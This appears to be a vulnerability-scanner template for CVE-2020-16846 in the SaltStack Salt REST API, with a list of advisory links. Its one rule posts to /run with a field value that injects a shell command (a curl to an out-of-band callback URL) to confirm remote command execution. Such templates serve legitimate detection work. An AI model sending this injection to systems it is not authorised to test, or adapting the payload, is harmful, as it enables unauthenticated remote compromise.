name: yaml-poc-saltstack-salt-unauthorized_access-CVE-2020-16846
binding: 7d301f47-3e22-4b85-a297-3d399b334ea6
detail:
    author: system_user
    links:
        - http://lists.opensuse.org/opensuse-security-announce/2020-11/msg00029.html
        - http://packetstormsecurity.com/files/160039/SaltStack-Salt-REST-API-Arbitrary-Command-Execution.html
        - https://cxsecurity.com/issue/WLB-2020110112
        - https://github.com/saltstack/salt/releases
        - https://lists.debian.org/debian-lts-announce/2020/12/msg00007.html
        - https://lists.debian.org/debian-lts-announce/2022/01/msg00000.html
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TPOGB2F6XUAIGFDTOCQDNB2VIXFXHWMA/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TPOGB2F6XUAIGFDTOCQDNB2VIXFXHWMA/
        - https://nvd.nist.gov/vuln/detail/CVE-2020-16846
        - https://packetstormsecurity.com/files/160016/Gentoo-Linux-Security-Advisory-202011-13.html
        - https://packetstormsecurity.com/files/160039/SaltStack-Salt-REST-API-Arbitrary-Command-Execution.html
        - https://security.gentoo.org/glsa/202011-13
        - https://vigilance.fr/vulnerability/Salt-privilege-escalation-via-API-33807
        - https://www.auscert.org.au/bulletins/ESB-2020.3863/
        - https://www.auscert.org.au/bulletins/ESB-2020.3914/
        - https://www.auscert.org.au/bulletins/ESB-2020.4300/
        - https://www.auscert.org.au/bulletins/ESB-2021.0275/
        - https://www.auscert.org.au/bulletins/ESB-2021.0592
        - https://www.auscert.org.au/bulletins/ESB-2022.0046
        - https://www.debian.org/security/2021/dsa-4837
        - https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/
        - https://www.zerodayinitiative.com/advisories/ZDI-20-1379/
        - https://www.zerodayinitiative.com/advisories/ZDI-20-1380/
        - https://www.zerodayinitiative.com/advisories/ZDI-20-1381/
        - https://www.zerodayinitiative.com/advisories/ZDI-20-1382/
        - https://www.zerodayinitiative.com/advisories/ZDI-20-1383/
    vulnerability:
        id: 651bb1db-8877-4e7e-a751-6f41730875e5
        level: critical
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /run
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: token=12312&client=ssh&tgt=*&fun=a&roster=aaa&ssh_priv=aaa|curl+{{reverseURL}}%3b
        expression: reverse.wait(5)
expression: r0()
